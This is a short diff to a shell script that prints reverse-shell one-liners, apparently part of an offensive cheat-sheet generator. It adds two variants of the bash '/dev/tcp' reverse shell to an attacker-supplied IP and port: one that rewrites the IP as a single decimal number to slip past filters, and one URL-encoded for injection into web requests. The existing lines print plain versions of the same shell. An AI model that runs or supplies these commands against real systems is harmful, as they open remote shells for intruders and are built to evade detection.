@@ -25,6 +25,8 @@ echo -e "${Frame}###${End} ${Title}Bash${End} ${Frame}###${End}"
 echo -e "${Point} bash >& /dev/tcp/$ip/$port 0>&1"
 echo -e "${Point} bash -i >& /dev/tcp/$ip/$port 0>&1"
 echo -e "${Point} bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" ${Comment}# wrapped${End}"
+echo -e "${Point} bash -c \"bash -i >& /dev/tcp/$(echo $ip | awk -F '\\.' '{printf "%d\n", ($1 * 2^24) + ($2 * 2^16) + ($3 * 2^8) + $4}')/$port 0>&1\" ${Comment}# dotted decimal to decimal${End}"
+echo -e "${Point} $(urlencode bash -c "bash -i >& /dev/tcp/$ip/$port 0>&1") ${Comment}# url encoded${End}"
 echo -e ""
 
 
